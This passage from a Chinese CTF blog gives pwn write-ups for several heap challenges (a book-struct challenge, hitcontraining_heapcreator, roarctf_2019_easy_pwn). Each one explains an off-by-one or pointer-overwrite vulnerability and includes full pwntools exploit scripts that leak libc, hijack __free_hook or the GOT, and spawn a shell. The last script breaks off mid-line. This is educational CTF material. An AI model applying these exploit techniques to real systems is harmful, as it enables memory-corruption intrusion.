<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><h4 id="平常使用show或者edit、free函数是怎么找到对应的chunk的？"><a href="#平常使用show或者edit、free函数是怎么找到对应的chunk的？" class="headerlink" title="平常使用show或者edit、free函数是怎么找到对应的chunk的？"></a>平常使用show或者edit、free函数是怎么找到对应的chunk的？</h4><p><strong>先去bss段找存放的对应结构体地址，然后去看结构体里面记录的chunk信息，再通过chunk信息（也就是chunk的地址）来找到对应的chunk</strong>。<u>现在我们已经把结构体地址给改了，如果我们能够往这个结构体地址里面写入数据，就相当于我们可以去非法进行edit、show、free了（因为可以去操作原本不存在的chunk）</u>。接下来的核心就是我们要确定是否能够往这个结构体里写入数据。</p>
<p>可以看到上图这个地址是0x000055937ccbe000。我们看一下当前两个chunk的地址。</p>
<p><img src="/../img/image-20221007204732988.png" alt="image-20221007204732988"></p>
<p>根据上图可以发现，我们现在并不能控制0x000055937ccbe000这个地址，但是我们可以控制第一个和第二个堆块（我们申请的chunk）的大小，<strong>我们只需要构造一下前两个堆块的大小，让0x000055937ccbe000这个地址落在description的这个chunk即可（因为我们edit可以编辑description这个chunk）</strong> 稍微算一下，只需要让第一个chunk大小为0xd0（调试或者自己用计算器减，都能算出来），那么就可以让0x000055937ccbe100(这里变成0x000055937ccbe100的原因是前两个堆块太的抬高，让第二字节的后半个字节进位了，但并不影响，因为覆盖的仅仅是最后一个字节成00）这个地址落在description这个chunk的范围里，这步的目的是为了接下来编辑结构体内容打下铺垫。（可以发现下图的description_chunk是从已经覆盖到了0x000055937ccbe100)</p>
<p><img src="/../img/image-20221007204742463.png" alt="image-20221007204742463"></p>
<p>接下来，我们只需用edit编辑这个chunk，然后构造一个struct_chunk即可。</p>
<p>将其中的description_chunk的地址改成free的got表，然后用show泄露它的真实地址，再用edit去修改它的真实地址？</p>
<p>我们先使用下面的脚本试试这件事情。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12af</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(free_got_addr)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>通过下图发现，伪造好free_got的地址放到description_chunk的位置，是开了pie。因此是行不通的，这里采用了另一种方法来泄露libc基地址。</p>
<p><img src="/../img/image-20221007204752038.png" alt="image-20221007204752038"></p>
<h4 id="通过mmap映射超大区域，来泄露libc基地址"><a href="#通过mmap映射超大区域，来泄露libc基地址" class="headerlink" title="通过mmap映射超大区域，来泄露libc基地址"></a>通过mmap映射超大区域，来泄露libc基地址</h4><p>在这之前，需要先看一下进程的空间布局。下图转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/cztqwan/article/details/80248479">(30条消息) 进程的内存空间布局_cztqwan的博客-CSDN博客_进程内存布局</a></p>
<p><img src="/../img/image-20221007204803175.png" alt="image-20221007204803175"></p>
<p>每个蓝色空间代表的区域，是否彼此存在随机的偏移，用了random offset来标注。可以看到<strong>内核空间，栈，内存映射段等等都存在着随机偏移，因此我们获取了栈地址也无法利用偏移来算出堆的地址</strong>，其余也是同理。但是<strong>内存映射段都是mmap映射的区域，包括了动态链接库（这里我是这么理解的，如果不对的话，还请指正），因此我们再用mmap映射一块区域，依旧是和动态链接库同属于一大块区域。因此新映射的这块区域和libc基地址存在固定偏移</strong>。怎么触发mmap映射一块区域呢？利用malloc申请一块超大内存来实现，同时这个地址也会被记录在结构体堆块中。</p>
<p>因此我们将结构体堆块中的description_chunk_addr改成<strong>指向mmap申请的那个地址</strong>即可(这个地址肯定是位于堆上的，因此我们现在需要获取一个堆的地址)</p>
<p>考虑到author name和结构体堆块的地址紧挨着，因此我们可以将author name给填满，然后打印author name，就得到了一个堆地址，脚本如下：</p>
<p><img src="/../img/LE5DOxmh7TVAZRU-1665146431267-54.png" alt="image-20220603202640806"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br></pre></td></tr></table></figure>



<p>接下来先申请一块超大内存，然后利用偏移将结构体堆块(这个结构体堆块是可控的那个堆块）中的description_addr改成指向结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中存放description_addr的地址。</p>
<p><img src="/../img/image-20221007204827458.png" alt="image-20221007204827458"></p>
<p>然后去泄露这个libc地址，脚本如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br></pre></td></tr></table></figure>

<p>拿到了libc基地址，我们就去劫持__free_hook，放入one_gadget地址，劫持方法跟泄露libc地址一样，我们将结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中的description改成__free_hook的地址，然后编辑该结构体，写入one_gadget地址。最后再释放掉随便一个堆块，即可获取shell。劫持__free_hook部分的脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>



<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x128B</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;tttt&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><h3 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h3><p>利用off_by_one把原本的结构体堆块释放再申请变成了申请的堆块，而原本的申请堆块释放再申请成了结构体堆块，从而控制结构体堆块中的堆块信息。关键点就是要把第二个堆块申请成0x10字节的（因为要保证申请结构体堆块的时候，把这个堆块释放掉再申请回来）</p>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204845732.png" alt="image-20221007204845732"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>各个函数实现的什么功能，我就不说了，应该都能看出来。分析几个有用的点。</p>
<p>首先这道题是有一个结构体（malloc申请了它的大小为0x10)，它用来记录申请的每个chunk的size和地址。（从下面两个图片可以分析出来）</p>
<p><img src="/../img/ZC1bBRYu9pnxK5q-1665146431268-57.png" alt="image-20220602080236010"></p>
<p><img src="/../img/WhklgpXZ3A1yY9L-1665146431268-58.png" alt="image-20220602080259732"></p>
<p>而实例化的每个结构体的地址存放到了bss段上。而之后去寻找指定的chunk进行删，改，打印操作都是先去bss段上去找存放的对应结构体，然后根据偏移来寻找其中的记录信息的size和地址成员。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img src="/../img/image-20221007204901719.png" alt="image-20221007204901719"></p>
<p>这里可以输入比申请的size多一个字节的数据，存在刻意的off_by_one漏洞。</p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>我们先申请两个chunk，看一下布局是怎样的。</p>
<p><img src="/../img/image-20221007204910840.png" alt="image-20221007204910840"></p>
<p>可以发现我们每添加一个chunk，都会在它上面（低地址）有一个，结构体堆块来记录信息。可是现在我们可以用edit往里面多写一个数据，正好可以溢出到下一个结构体堆块的size位，这意味着可以控制下一个结构体堆块的大小。</p>
<p><img src="/../img/image-20221007204918905.png" alt="image-20221007204918905"></p>
<p>现在我们利用溢出把这个chunk的大小改成0x41（如上图），这就意味着程序现在把原本的结构体堆块和我们申请的chunk当成了一个结构体chunk。现在我们执行delete(1)将其删除，我们就会得到两个处于释放掉的chunk（把申请的chunk（大小为0x20)和结构体堆块（此时是0x41了）都释放掉了）如下图</p>
<p><img src="/../img/image-20221007204926366.png" alt="image-20221007204926366"></p>
<p>接下来就是核心利用点，我们再申请0x30的大小，这样fastbin里0x40的chunk就会被申请回原来的位置。与此同时程序会自己申请一个0x10的chunk，也就将fastbin里的0x20也申请回去了。<strong>但0x40的这个chunk包含了0x20的这个chunk，而0x40是用户堆块，我们可以往里面写入数据，从而修改里面的0x20的结构体堆块。</strong>(如下图)</p>
<p><img src="/../img/image-20221007204934515.png" alt="image-20221007204934515"></p>
<p><u>原本结构体堆块是来描述chunk1的信息的（换句话就是，谁是chunk1是由结构体堆块说了算），结果现在结构体堆块到了chunk1的里面，因此现在我们就可以通过控制结构体堆块来伪造chunk1。</u></p>
<p>我们将chunk1的地址改成（也就是在改结构体堆块的地址成员）atoi的got表，再执行show函数的时候，本来是打印chunk1地址里的内容的，可是现在chunk1的地址改成了atoi的got表，因此实现了泄露atoi的真实地址。同理，执行edit函数的时候，本来是要修改chunk1地址里的内容，结果现在chunk1的地址改成了atoi的got表，因此就相当于修改atoi的真实地址了，改为system，传入&#x2F;bin&#x2F;sh即可获取shell。<strong>（要注意的就是写入atoi的got表时，顺便要伪造一个size，因为edit的时候还需要用到这个size，如果填充成0的话，是写不进去数据的）</strong></p>
<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400A43</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29606)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x20</span>)+p64(atoi_got_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr_bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略;"></a>保护策略;</h3><p><img src="/../img/image-20221007205054593.png" alt="image-20221007205054593"></p>
<h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221007205111216.png" alt="image-20221007205111216"></p>
<p>猛一看感觉是常规堆溢出，没有对edit函数中的输入数据的大小做检查。不过仔细点开sub_E26这个函数发现，是进行了检查，如果edit函数中的size大于了add函数时堆块的大小，那么就选择add函数时堆块的大小，如果edit函数中的size小于了add函数时创建的堆块大小，那么就选择edit函数的size。</p>
<p>不过还有一种情况产生了off by one的漏洞，也就是edit函数中的size正好比add函数创建堆块大小大了10,，此时就会产生off by one漏洞（如下）</p>
<p><img src="/../img/image-20221007205123375.png" alt="image-20221007205123375"></p>
<h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>然后就是常规的off by one手法，上面已经讲过了。大致就是off by one造成合并之后，spy_chunk位于了一片free的内存中，然后进行申请一定大小的size，正好将spy_chunk的用户区域上存放unsortedbin 中的fd指针，然后将其打印出来，获取libc基地址。</p>
<p>然后将spy chunk释放掉，再申请回来，打fastbin attack，将__malloc_hook申请出来，打one_gadget。</p>
<p>然而发现所有的one_gadget都不能使用，那选择用realloc函数来调整栈帧，再打one_gadget。使用realloc函数调整栈帧可以看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16421631.html">这篇文章</a></p>
<h3 id="EXP：-2"><a href="#EXP：-2" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28799</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merged chunk</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merge chunk</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span 